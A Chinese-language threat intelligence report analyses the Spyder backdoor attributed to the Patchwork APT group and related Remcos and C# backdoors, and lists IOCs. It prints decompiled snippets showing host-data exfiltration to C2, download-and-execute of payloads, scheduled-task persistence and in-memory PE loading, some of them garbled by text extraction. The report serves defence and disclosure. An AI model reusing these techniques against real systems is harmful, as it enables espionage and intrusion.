# 疑似摩诃草组织利用WarHawk后门变种Spyder窥伺多国  

原创威胁情报中心奇安信威胁情报中心2023-07-0414:38发表于四川  

## I团伙背景  

摩诃草，又名Patchwork、白象、Hangover、Dropping Elephant等，奇安信内部跟踪编号APT-Q-36。该组织被普遍认为具有南亚地区背景，其最早攻击活动可追溯到2009年11月，已持续活跃10余年。该组织主要针对亚洲地区的国家进行网络间谍活动，攻击目标包括政府、军事、电力、工业、科研教育、外交和经济等领域的组织机构。  

## I事件概述  

近期，奇安信威胁情报中心在日常样本跟踪分析过程中，发现一批与摩诃草存在关联的恶意样本，攻击者使用的后门并非摩诃草组织此前常用的木马。无独有偶，国外安全研究人员也发现了其中几个样本[1]，根据C2服务器登录界面的信息将该后门命名为Spyder，并指出样本与WarHawk后门存在相似之处。后者由Zscaler在去年10月发布的报告[2]中披露，被认为是南亚另一个APT组织响尾蛇（Sidewinder）的攻击武器。  

#Spyder malware looks to be an update of #WarHawk malware from   
#Sidewinder #APT   
1f4b225813616fbb087ae211e9805baf   
BAFOperationsReportCamScannerDocument.exe   
c2 hxxp[:1]//plainboardssixty[.]com/drive/bottom.php  

  

根据Spyder后门早期样本使用的数字签名和以此关联到的Remcos木马样本，我们更倾向于认为背后的攻击团伙是摩诃草。此外我们由攻击者使用的一个IP发现了另一款用C#编写的轻量级后门。  

## I详细分析  

捕获到的Spyder样本基本信息如下:  

疑似摩诃草组织利用WarHawk后门变种Spyder窥伺多国  


<html><body><table><tr><td>MD5</td><td>创建时间</td><td>数字签名 有</td><td>文件名称</td></tr><tr><td>eb9068161ba a5842b40d55 65130526b9</td><td>2023-04-091 9:36:29 UTC</td><td></td><td>LISTOFSIGNALADDRESSES, CALL SIGN 10 Apr 2023.exe</td></tr><tr><td>b874f18acb3 af7c340357</td><td>9:20:42 UTC</td><td>有</td><td>PNSHIPOVERSEASDEPLOY MENTPLAN TOFAREASTC HINA.exe</td></tr><tr><td>02433bc0f4d 3113714f16</td><td>7:34:16 UTC</td><td>2023-04-30 1 有</td><td>Rocket Launch System THE UP DT LIST OF MLRS PROB-.exe</td></tr><tr><td>3da3c2b47b7 6d9f88850</td><td>7:24:01 UTC</td><td>2023-06-070 无</td><td>Read-Me New Naxal VPN Confi gration Settings.exe</td></tr><tr><td>53b3a018dla 4d935ea7dd7 431374cafl</td><td>9:22:05 UTC</td><td>2023-06-130 无</td><td>Read-Me New Naxal VPN Confi gration Settings.exe</td></tr><tr><td>1f4b2258136 16fbb087ae2 11e9805baf</td><td>2023-06-13 0 9:22:05 UTC</td><td>有</td><td>BAF Operations Report CamScan nerDocument.exe</td></tr></table></body></html>  

上述样本均以Word、Excel、PDF等文档图标进行伪装。按照样本大小、创建时间和代码相似性，可以分为原始版（4月样本）和新版（6月样本）两类，新版相比原始版的代码进行了部分改动。结合样本名称、VT上传地和样本中的配置信息，Spyder后门的攻击目标包括中国、巴基斯坦、尼泊尔警察局、孟加拉国空军。  

# Spyder新版  

6月攻击样本几乎一样，包括C2信息，仅部分配置数据不同。以下面样本为例进行分析。  

<html><body><table><tr><td>MD5</td><td>1f599f9ab4ce3da3c2b47b76d9f88850</td></tr><tr><td>文件大小</td><td>380928字节（372.00KB）</td></tr><tr><td>文件类型</td><td>PE32EXE</td></tr></table></body></html>  

首先获取文件资源"FONTS"类别下"TRUETYPE"中的数据，用"ROUND9"作为异或解密的key，解密得到一系列配置数据。  

  

  

解密得到的数据部分如下所示，包括后门agent代号（配置数据中最开始的4字节，数值为 $"3"$ ）、互斥量名称和C2通信URL。  

  

除了从配置数据中获得关键字符串，后门还常用如下异或的方式解密所需字符串。  

  

调用CreateMutexA创建互斥量之后，后门开始收集感染设备相关信息，收集的信息以及获取方式分别如下：  

<html><body><table><tr><td colspan="2">信息类型 获取方式</td></tr><tr><td>Machine GUID</td><td>查询注册表HKLM\SOFTWARE\Microsoft\Cryptography中Mach ineGuid的数据</td></tr><tr><td>主机名</td><td>调用GetComputerNameExW</td></tr></table></body></html>  

<html><body><table><tr><td>用户名</td><td>调用GetUserNameW</td></tr><tr><td>系统版本</td><td>查询注册表HKLM\SOFTWARE\Microsoft\WindowsNT\Curren tVersion中ProductName的数据</td></tr><tr><td>系统位数</td><td>调用GetNativeSystemInfo</td></tr><tr><td>杀软信息</td><td>WMI查询root\SecurityCenter2中数据</td></tr><tr><td>Profile</td><td>从资源区解密的配置数据中获取</td></tr><tr><td>Mail</td><td>从资源区解密的配置数据中获取</td></tr></table></body></html>  

使用Base64编码的变体Y64对上面信息分别进行编码。  

向用于C2通信的URL（"hxxp://plainboardssixty.com/drive/bottom.php"）发送POST请求，回传信息为Machine GUID和配置数据中的邮箱名。如果响应为"1"，则直接进入休眠状态。  

  

将当前文件复制为用户"C:\Users\[user_name]\AppData\Roaming"目录下的DllHostcache文件，创建一系列计划任务，运行时间为第二天指定时间。  

198 v18 $=$ L"Microsoft Corporation. All rights reserved."   
199 v105 $=$ sub_4015Eo((LPcCH)(g_rsc_decode_data + 0x22c));// D1lHostcache   
200 v19 $=$ L"Microsoft Corporation. All rights reserved.";   
201 v20 $=$ L"Attribute Utility 10";   
202 v111 $=$ \*(LPCSTR \*)g_rsc_decode_data; //解密的config最开始4字节为一个整型数   
203 if ( \*(_DWORD \*)g_rsc_decode_data $==3$ )   
204 v19 $=$ L"2017 Microsoft Corporation. All rights reserved.";   
205 if （ \*(_DWORD \*)g_rsc_decode_data $==3$ ）   
206 v20 $=$ (OLECHAR \*)L"WMI Provider Host 10";   
207 sub_401970(v105，v20，(int)&savedregs，(int)v19，(int)L"10:00:00"，(int)v19);   
208 $\vee21=$ L"Attribute Utility 11";   
209 if（v111 $==$ (LPCSTR)3)   
210 $\vee21=$ (OLECHAR \*)L"WMI Provider Host 11";   
211 sub_401970(v105，v21,(int)&savedregs，(int)v19，(int)L"11:00:00"，(int)v19);   
212 $v22=$ L"Attribute Utility 12";   
213 if（v111 $==$ (LPCSTR)3)   
214 $\vee22=$ (OLECHAR \*)L"WMI Provider Host 12";   
215 sub_401970(v105，v22,(int)&savedregs，(int)v19，(int)L"12:00:00"，(int)v19);   
216 V23 $=$ L"Attribute Utility 13";   
217 if（v111 $==$ (LPCSTR)3)   
218 v18 $=$ L"2017 Microsoft Corporation. All rights reserved";   
219 if （ $\vee111==$ (LPCSTR)3)   
220 v23 $=$ (OLECHAR \*)L"WMI Provider Host 13";   
221 sub_401970(v105,v23，(int)&savedregs，(int)v19，(int)L"13:00:00"，(int)v18);   
222 $\downarrow24=$ L"Attribute Utility 14";   
223 if（ $\vee111==$ (LPCSTR)3）   
224 $\vee24=$ (OLECHAR \*)L"WMI Provider Host 14";   
225 sub_401970(v105,v24，(int)&savedregs，(int)v19，(int)L"14:00:00"，(int)v19);   
226 GlobalFree(v105);  

<html><body><table><tr><td>WMIProviderHost10准备就绪</td><td></td><td></td><td>在2023/6/13的10:00时2023/6/1310:00:00不显示</td><td>2017MicrosoftCorporation.Allrightsreserved.</td></tr><tr><td>WMIProviderHost11准备就结</td><td></td><td>在2023/6/13的11:00时2023/6/1311:00:00</td><td>不显示</td><td>2017 Microsoft Corporation. All rights reserved.</td></tr><tr><td>WMIProviderHost12</td><td>准备就绪</td><td>在2023/6/13的12:00时</td><td>2023/6/1312:00:00 不显示</td><td>2017MicrosoftCorporation.Allrightsreserved.</td></tr><tr><td>WMIProviderHost13</td><td>准备就绪</td><td>在2023/6/13的13:00时</td><td>2023/6/13 13:00:00 不显示</td><td>2017MicrosoftCorporation.Allrightsreserved</td></tr><tr><td></td><td></td><td>WMIProviderHost14准备就结在2023/6/13的14:00时2023/6/1314:00:00</td><td>不显示</td><td>2017 Microsoft Corporation. All rights reserved.</td></tr></table></body></html>  

<html><body><table><tr><td>常规</td><td>校发器</td><td>损作 条件</td><td>设置 历史记录（已禁用）</td><td colspan="3"></td></tr><tr><td></td><td>创建任务时，必须指定任务启动时发生的损作，若要更改这些损作，使用“属性命令打开任务属件页。</td><td></td><td></td><td></td><td></td></tr><tr><td>操作</td><td></td><td>详细信息</td><td></td><td></td><td></td></tr><tr><td>启动程序</td><td></td><td>C:Users</td><td></td><td>\AppData\Roaming\DllHostcache</td><td></td></tr></table></body></html>  

### 回传之前收集的信息。  

235 if （ g_is_64_arch )   
236 wsprintfA(   
237 v32,   
238 "hwid=%s&username=%s&compname=%s&osname=%s&arch=1&av=%s&agent=%i&profile=%s&mail=%s",   
239 g_encode_machine_guid,   
240 g_encode_username,   
241 g_encode_cmpname,   
242 g_encode_os_version,   
243 g_encode_av_info,   
244 \*(_DWORD \*)g_rsc_decode_data,   
245 g_encode_profile,   
246 g_encode_email);   
247 else   
248 wsprintfA(   
249 v32,   
250 "hwid=%s&username=%s&compname=%s&osname=%s&arch=0&av=%s&agent=%i&profile=%s&mail=%s",   
251 g_encode_machine_guid,   
252 g_encode_username,   
253 g_encode_cmpname,   
254 g_encode_os_version,   
255 g_encode_av_info,   
256 \*(_DWORD \*)g_rsc_decode_data,   
257 g_encode_profile,   
258 g_encode_email);   
259 memset(String1, 0, sizeof(String1));   
260 v33 $=$ lstrlenA;   
261 v34 $=$ lstrlenA(v32);   
262 MwPostRequest(v32,v34,(int)String1,0x1000u);  

<html><body><table><tr><td colspan="2">字段名称 含义</td></tr><tr><td>hwid</td><td>MachineGUID</td></tr><tr><td>username</td><td>用户名</td></tr><tr><td>compname</td><td>主机名</td></tr><tr><td>osname</td><td>系统版本</td></tr><tr><td>arch</td><td>系统位数</td></tr><tr><td>av</td><td>杀软信息</td></tr><tr><td>agent</td><td>配置数据中的后门agent代号（数值为“3”）</td></tr><tr><td>profile</td><td>配置数据中的profile信息</td></tr><tr><td>mail</td><td>配置数据中的邮箱名</td></tr></table></body></html>  

然后进入while循环，每次循环首先从配置数据中的另一个URL“hxxp://plainboardssixty.com/drive/chilli.php"下载文件保存在Startup目录中，如果下载成功则运行该文件。  

14 SHGetKnownFolderPath(&stru_4422C0, 0,0, &var_startup);// FOLDERID_Startup   
15 memset(String1，0,sizeof(String1));   
16 lstrcpyw(String1, var_startup);   
17 lstrcatW(String1, L"\\weiboo.exe");   
18 $=$ (const CHAR \*)(g_rsc_decode_data + 0x3EC);// http://plainboardssixty.com/drive/chilli.php   
19 lpString $\l=$ (const CHAR \*)(g_rsc_decode_data $^+$ 0x3EC);   
20 $\begin{array}{r l}{\mathbf{v}\bot}&{{}=}\end{array}$ lstrlenA((LPCSTR)(g_rsc_decode_data $^+$ 0x3EC));   
21 $\vee2=$ MultiByteToWideChar(OxFDE9u,0,v0，v1,0，θ);   
22 $v7=$ (WCHAR \*)GlobalAlloc(0x40u, $2^{*}\vee2+2$   
23 $\vee3=$ istrlenA(lpString);   
24 MultiByteToWideChar(0xFDE9u, 0, lpString, v3, v7, v2);   
25 if （!URLDownloadToFileW(0,v7，String1，0，θ））   
26 {   
27 v4 $=$ lstrlenW(String1);   
28 v5 $=$ (WCHAR \*)GlobalAlloc(0x40u，2 \*v4+64);   
29 wsprintfW(v5, L"/k \"%s\"", String1);   
30 CoInitializeEx(0,6u);   
31 ShellExecuteW(0, L"open",L"cmd.exe", v5, 0, 0);   
32 CoUninitialize();   
33   
34 GlobalFree(v7);   
35 return 0;   
36}   
00002490 MwDownloadExec:3 (403090) (Synchronized with IDA View-A, Hex View-1)  

之后与C2进行多次交互，下载后续载荷并运行，交互过程如下。  

(1）获取指令  

向C2发送"hwid $=$ %s&deploy $\bf\Pi=1\bf\Pi^{\prime\prime}$ ，获取返回指令。后门提供的指令只 有字符"1","2","3"三种，三种指令功能均为获取后续载荷并运行。  

312 WsprintfA(v39, v43, g_encode_machine_guid);/ / hwid=%s&deploy=1   
313 memset(v129,0, sizeof(v129));   
314 v45 $=$ istrlenA(v39);   
315 MwPostRequest(v39，v45，(int)v129，0x1000u);   
316 GlobalFree(v39);   
317 if （lstrcmpA(v129，"1"）)   
318 {   
319 if（lstrcmpA(v129，"2"）)   
320   
321 if（!lstrcmpA(v129,L"3"））   
322   
323 v93 = \*((_DWORD \*)v35 + 105);   
324] v121[0] $=$ 0xF8652984;  

(2）获取包含后续载荷的压缩包名称和解压密码  

选择具体指令后，向C2发送"hwid $=$ %s&deploy $=$ %d&bakmout $=$ 1"，hwid字段仍为编码后的Machine GUID，而deploy字段对应所选指令 数字。  

此次响应消息为JSON字符串，包含name和pass两个字段，分别对应压缩包名称和解压密码。  

### (3）下载压缩包并解压执行  

下载URL为"hxxp://plainboardssixty.com/drive/[name].zip"的压缩包，以pass字段保存的密码解压。下载的压缩包和解压出的文件均保存在"C:\Users\[user_name]\AppData\Local"目录中，接着运行解压得到的文件。  

173 wsprintfW(v61,L"%hs://%hs%hs/%hs.zip",&g_str_http, g_str_server, g_str_url,\*((_DwoRD \*)v53 + 4));   
174 lstrcpyW(v62, g_folder_LocalAppdata);   
175 lstrcatW(v62, L"\\");   
176 lstrcatW(v62, a2);   
177 v53 $=$ (CHAR \*)MwDownloadData(v61,(size_t \*)&v52);   
178 v27 $=$ CreateFileW(v62,0x10000000u,1u,0,2u，0x80u，0);   
179 WriteFile(v27,v53,(DWORD)v52,&v57[1],θ);   
180 CloseHandle(v27);   
181 v28 $=$ lstrlenW(v62);  

### (4）通知C2操作结束  

向C2发送"hwid $=$ %s&deploy $\mathtt{\Gamma}=0^{\"}$ ，表示已运行下载的载荷，删除下载的压缩包，休眠2s后进入下一次循环。  

555 wsprintfA(v80, v84, g_encode_machine_guid);// hwid=%s&deploy=0   
556 memset(v129,0, sizeof(v129));   
557 v86 $=$ lstrlenA(v80);   
558 MwPostRequest(v80, v86, (int)v129, 0x1000u);   
559 GlobalFree(v80);   
560 DeleteFileW(FileName);   
561 GlobalFree(v110);   
562   
563 Sleep(2000u);   
564 v33 $\Bumpeq$ lstrlenA;   
565   
566  

后门指令详细说明如下。  

<html><body><table><tr><td>指令</td><td>说明</td></tr><tr><td>.I</td><td>下载压缩包的本地保存名称为slr.zip，压缩包中1.bin文件解压保 存为slb.dll，通过rundl132运行该DLL的导出函数CreateInterfaac e。</td></tr><tr><td>"2"</td><td>下载压缩包的本地保存名称为slr_2.zip，压缩包中2.bin文件解 压保存为sihost.exe，运行该EXE文件。</td></tr><tr><td>"3"</td><td>下载压缩包的本地保存名称为slr_3.zip，压缩包中3.bin文件解 压保存为secd.exe，运行该EXE文件。</td></tr><tr><td>其他</td><td>无操作</td></tr></table></body></html>  

6月另外两个样本与上述样本几乎一样，不同之处在于：  

1．配置数据中的互斥量、profile和email的名称不同;  
2. 循环开始时从hxxp://plainboardssixty.com/drive/chilli.php下载文件的保存名称为gameinput.exe;  
3.指令"2"和"3"释放文件保存名称分别为"Microsoft.Web.Pagelnspector.exe"和"DocumentFormat.OpenXml.exe"， 保存在"AppData\Local"的"Microsoft.Web"子目录下。  

# Spyder原始版  

4月的原始版样本与6月的新版样本之间的差异不大，主要不同之处在以下几个方面：  

（1）配置用的关键字符串在初始化函数中异或解密，而不是像新版样本从资源区解密得到；  

  

(2）在创建一系列计划任务和回传收集的信息之前，没有与C2交互并根据响应选择是否休眠的操作；  

  

(3）与C2通信的循环开始时，没有从另一个额外的URL下载载荷并执行；  

(4）虽然两个版本的样本回传信息的格式一致，但是原始版本中的profile只是代号，mail没有邮箱名，不像新版中具有明确的指向。  

4月样本的配置数据如下所示。  

<html><body><table><tr><td>MD5</td><td>eb9068161baa5842b40d5565130526b9</td></tr><tr><td>C2</td><td>(通信） hxxp://gclouddrives.com/spyder/smile.php (下载) hxxp://gclouddrives.com/spyder/[name].zip</td></tr><tr><td>profile</td><td>TS-001</td></tr><tr><td>mail</td><td>N</td></tr></table></body></html>  

<html><body><table><tr><td>MD5</td><td>87d94635372b874f18acb3af7c340357</td></tr><tr><td>C2</td><td>(通信） hxxp://alibababackupcloud.com/spyder/smile.php (下载） hxxp://alibababackupcloud.com/spyder/[name].zip</td></tr><tr><td>profile</td><td>TS-002</td></tr><tr><td>mail</td><td>N</td></tr></table></body></html>  

<html><body><table><tr><td>MD5</td><td>1fa3f364bcd02433bc0f4d311371416</td></tr><tr><td>C2</td><td>(通信） hxxp://cloudplatfromservice.one/cpidr/balloon.php (下载) hxxp://cloudplatfromservice.one/cpidr/[name].zip</td></tr><tr><td>profile</td><td>TS-004</td></tr><tr><td>mail</td><td>N</td></tr></table></body></html>  

值得注意的是，早期样本的C2路径中也出现了"spyder"字符串，而且样本中的profile均为"TS-"格式，中间缺失的代号意味着4月的攻击很可能还有其他受害者。  

## 与WarHawk的比较  

Spyder与Zscaler披露的WarHawk后门[2]存在一些相似之处，但后门指令对应的操作有较大差别。  

### 相似之处  

(1）向C2发送POST请求的函数相似，且使用的User Agent相同。  

  

(2）收集的设备信息相似，并且均以hwid（即Machine GUiD）作为C2通信中的受害者标识。  

  

(3）两者的C2指令均以数字字符区分不同操作，且下发的C2指令均存在JSON格式的字符串。  

## 差异  

两种后门的差别体现在后门指令的分发形式和具体功能上。WarHawk后门在指令循环中依次调用实现每种指令功能的函数，各个函数首先询问C2是否进行该操作，然后根据C2服务器的回复选择执行或者跳过。下图为WarHaWk后门的相关代码。  

149 v32=(CHAR \*)GlobalAlloc(0x40u，2 \*v31);   
150 wsprintfA(v32, "{ \"_hwid)": \"%s\", \"_ping\": \"true\" }", String);   
151 memset(String1, 0, sizeof(String1));   
152 v33 $=$ lstrlenA(v32);   
153 MwPostRequest(v33, v32, String1);   
154 GlobalFree(v32);   
155 while（lstrcmpA(String1，"del"）)   
156 {   
157 sub_407c80(); // task: downloading and executing additional payloads   
158 sub_407F80(); // cmd: executing system commands   
159 sub_408250(); // filemgr: gathering and sending file information   
160 sub_408520(); //fileupload: uploading files on the infected host from C2   
161 Sleep(OxFA0u);   
162 v34 $\mathbf{\varepsilon}=$ lstrlenA(String);   
163 v35 $=$ (CHAR \*)G1obalA11oc(0x40u, 2 \*v34);   
164 wsprintfA(v35, "f \"_hwid)": \"%s\", \"_ping\": \"true\" }", String);   
165 memset(String1, 0, sizeof(String1));   
166 v36 $\mathbf{\varepsilon}=$ 1strlenA(v35);   
167 MwPostRequest(v36, v35, String1);   
168 GlobalFree(v35);   
169   
170 v37 $=$ lstrlenA(String);   
171 v38 $=$ (CHAR \*)GlobalA11oc(0x40u, 2 \*v37);   
172 wsprintfA(v38, "{\"_hwid\": \"%s\", \"_del\": \"true\" }", String);   
173 memset(String1,0,sizeof(String1));   
174 v39 $=$ lstrlenA(v38);   
175 MwPostRequest(v39, v38, String1);   
176 GlobalFree(v38);   
177 ExitProcess(e);   
178}  

WarHawk后门支持的功能包括下载并执行后续载荷、命令执行、文件信息收集回传、下载文件。而Spyder后门的功能集中在下载并执行后续载荷。  

## I溯源关联  

### 归属  

Spyder后门早期样本（MD5:eb9068161baa5842b40d5565130526b9）带有的数字签名"Integrated Plotting Solutions Limited"也被摩诃草的其他样本使用过。  

### 数字签名详细信息  

#### 常规  

#### 高级  

数字签名信息一个副署无效。文件可能已更改。  

#### 签名人信息（S)  

  

副署(U)  

  

#### 确定  

此外，根据另一个Spyder后门样本（MD5:87d94635372b874f18acb3af7c340357）使用的数字签名"HILLFOOT DEVELOPMENTS（UK）LTD."关联到一个Remcos木马样本。  

<html><body><table><tr><td>文件名 smss.exe</td></tr><tr><td>MD5 acbae6919c9ce41f45ce0d1a3f3fedd4</td></tr><tr><td>创建时间 2023-04-1715:47:39UTC</td></tr><tr><td>数字签名时间 2023-04-1807:24:00UTC</td></tr><tr><td>文件大小 1026840字节（1002.77KB)</td></tr></table></body></html>  

该样本首先创建一系列计划任务，做法与Spyder后门相似。  

101 sub_4087A0(   
102 L"glassdoor.exe",   
103 (OLECHAR \*)L"Glass Door Service 10",   
104 (int)L"10:00:00",   
105 (OLECHAR \*)L"Copyright 2018 Glass Door LLC.");   
106 sub_4087A0(   
107 L"glassdoor.exe",   
108 (OLECHAR \*)L"Glass Door Service 11"   
109 (int)L"11:00:00",   
110 (OLECHAR \*)L"Copyright 2018 Glass Door LLC.");   
111 sub_4087A0(   
112 L"glassdoor.exe",   
113 (OLECHAR \*)L"Glass Door Service 12",   
114 (int)L"12:00:00",   
115 (OLECHAR \*)L"Copyright 2018 Glass Door LLC.");   
116 sub_4087A0(   
117 L"glassdoor.exe",   
118 (OLECHAR \*)L"Glass Door Service 13",   
119 (int)L"13:00:00",   
120 (OLECHAR \*)L"Copyright 2018 Glass Door LLC.");   
121 sub_4087A0(   
122 L"glassdoor.exe"   
123 (OLECHAR \*)L"Glass Door Service 14",   
124 (int)L"14:00:00",   
125 (OLECHAR \*)L"Copyright 2018 Glass Door LLC.");   
126 sub_4087A0(   
127 L"glassdoor.exe",   
128 (OLECHAR \*)L"Glass Door Service 14",   
129 (int)L"14:00:00",   
130 (OLECHAR \*)L"Copyright 2018 Glass Door LLC.");  

### 然后解密出Remcos木马的PE文件数据，内存加载执行。  

136 (OLECHAR \*)L"Glass Door Service 14"   
137 (int)L"14:00:00",   
138 (OLECHAR \*)L"Copyright 2018 Glass Door LLC.");   
139 sub_40B1B0(); //usernamecheck   
140 sub_40B170(); // time check   
141 v8 $=$ sub_40B270(v12, "kernel32.dll");   
142 v9 $=$ sub_40B210(v8);   
143 Mw_Remap(v9); // 参数"kernel32.dll"   
144 //重新加载kernel32.dll的.text段（解除挂钩）   
145 sub_40A540(); //检查eventlog服务   
146 Mw_DecryptInit((int)v41，(int)v43，65); // decrypt key init   
147 var_mem $=$ Global1Alloc(0x40u,0x77201u);   
148 Mw_Decrypt((int)v41, (int)&unk_42FA68, (int)var_mem, 0x77200);// decrypt   
149 v25 $=$ (void \*\*)Mw_LoadPe(var_mem); //load PE   
150 $v22=$ NtCurrentPeb();   
151 v22->Mutant $=*\times25$   
152 v21 =\*((_DwORD \*)v22->ImageBaseAddress + 5);   
153 \*(_DWORD \*)(v21 + 16）= \*v25;   
154 v42 = v25[2];   
155 sub_40AA00(30000u);   
156 asm{jmp [ebp+var_4C]}   
157 return result;   
158}  

而摩诃草组织在此前的攻击活动中也常用Remcos木马。综合以上线索，我们认为Spyder后门攻击活动背后的团伙很可能是摩诃草。  

## 其他关联样本  

### 上述Remcos木马样本的C2为192[.]169.7.142:80。  

  

关联到另一个样本与该IP通信，为C#编写的轻量级后门。  

<html><body><table><tr><td>文件名</td></tr><tr><td>MD5 e3b37459489a863351d855e594df93bf</td><td></td></tr><tr><td>创建时间</td><td>2075-03-0702:18:38UTC</td></tr><tr><td>VT上传时间</td><td>2023-05-2620:26:23UTC</td></tr><tr><td>文件大小</td><td>17408字节（17.00KB)</td></tr></table></body></html>  

Config数据如下，与C2服务器通信的URL格式为"hxxps://192.169.7.142:4546/search?q $=$ search[<host_name>"。  

  

Fetch方法通过GET请求从C2服务器获取指令数据，然后对获取数据进行处理，包括逆序、GZ解压、消除字符串"XXPADDINGXXPADDINGXXPADDINGXX"。创建cmd.exe进程，代码页设置为437，执行上述处理后的指令数据。  

  

  

Reply方法将cmd.exe进程执行命令的结果处理后，通过POST请求发送给C2服务器。处理过程为添加字符串"XXPADDINGXXPADDINGXXPADDINGXX"、GZ压缩、逆序。  

  

该轻量后门功能极其简单，很可能是在攻击过程中结合其他恶意软件使用。  

更进一步，我们发现该C#后门还有其他样本也上传到VT，实现代码略有不同。  

<html><body><table><tr><td>文件名</td><td>not default config.exe</td></tr><tr><td>MD5</td><td>4a25a52244f3360b0fffd0d752833bfl</td></tr><tr><td>创建时间</td><td>2098-11-2907:58:55UTC</td></tr><tr><td>VT上传时间</td><td>2023-05-0910:01:52UTC</td></tr><tr><td>文件大小</td><td>56320字节（55.00KB)</td></tr></table></body></html>  

  

配置数据中C2服务器为内网IP，意味着该样本可能是测试版本。  

  

# I总结  

南亚地区的多个APT组织之间存在干丝万缕的联系，此次攻击多国目标的Spyder后门就是一个例子。它与此前披露的响尾蛇组织WarHawk后门存在不少相似之处，而根据早期样本的数字证书和关联的Remcos木马样本，S  

pyder后门更可能是出自摩诃草之手。此外，我们通过攻击者使用的基础设施还发现了其他后门，以上迹象表明攻击者在不断地扩充自己的武器库。  

# I防护建议  

奇安信威胁情报中心提醒广大用户，谨防钓鱼攻击，切勿打开社交媒体分享的来历不明的链接，不点击执行未知来源的邮件附件，不运行标题夸张的未知文件，不安装非正规途径来源的APP。做到及时备份重要文件，更新安装补丁。  

若需运行，安装来历不明的应用，可先通过奇安信威胁情报文件深度分析平台（https://sandbox.ti.qianxin.com/sandbox/page）进行判别。目前已支持包括Windows、安卓平台在内的多种格式文件深度分析。  

目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。  

  

## IOC  

### MD5  

https://mp.weixin.qq.com/s/ewGyvlmWUD45XTVsoxeVpg (Spyder) eb9068161baa5842b40d5565130526b9 87d94635372b874f18acb3af7c340357 1fa3f364bcd02433bc0f4d3113714f16 1f599f9ab4ce3da3c2b47b76d9f88850 53b3a018d1a4d935ea7dd7431374caf1 1f4b225813616fbb087ae211e9805baf (Remcos) acbae6919c9ce41f45ce0d1a3f3fedd4 (C#后门) e3b37459489a863351d855e594df93bf 4a25a52244f3360b0fffd0d752833bf1  

### c&C  

plainboardssixty.com gclouddrives.com alibababackupcloud.com cloudplatfromservice.one  

192[.]169.7.142:80   
192[.]169.7.142:4546  

### URL  

hxxp://plainboardssixty.com/drive/ hxxp://gclouddrives.com/spyder/ hxxp://alibababackupcloud.com/spyder/ hxxp://cloudplatfromservice.one/cpidr/ hxxps://192.169.7.142:4546/search?q $=$ search[  

## 1参考链接  

[1].https://twitter.c0m/Axel_F5/status/1669794530592170001 https://mp.weixin.qq.com/s/ewGyvlmWUD45XTVsoxeVpg  